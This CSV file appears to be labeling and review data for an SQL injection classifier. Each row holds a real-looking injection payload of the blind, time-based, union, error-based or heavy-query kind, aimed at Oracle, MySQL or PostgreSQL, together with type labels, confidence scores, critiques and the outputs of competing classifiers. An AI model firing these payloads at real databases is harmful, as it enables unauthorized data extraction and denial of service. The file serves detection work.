payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
-1252' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'pzxh' like 'pzxh,out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,19800,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,-1252' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'pzxh' like 'pzxh
-8684' where 9820 = 9820 or 6844 = 5105,boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,19801,boolean_blind,generic,Pattern match: 'or 6844 = 5105' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8684' where 9820 = 9820 or 6844 = 5105
"1%' ) ) ) union all select null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,19802,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) ) union all select null,null,null,null--"
"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'inrm' like 'inrm",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,19803,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'inrm' like 'inrm"
"( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 2768 = 2768,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",boolean_blind,mysql,0.7,count_concat,RELABEL,reasoning too short (12 chars),boolean_blind,mysql,19804,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 2768 = 2768,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )"
1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,19805,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu )
"1%' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),heavy_query,postgresql,19806,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
select sleep ( 5 ) ) +',time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,19807,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) ) +'
"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,19808,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #"
( select ( case when ( 3950 = 2747 ) then 1 else 1/ ( select 0 ) end ) ),boolean_blind,generic,0.5,case_division,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,19809,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( select ( case when ( 3950 = 2747 ) then 1 else 1/ ( select 0 ) end ) )
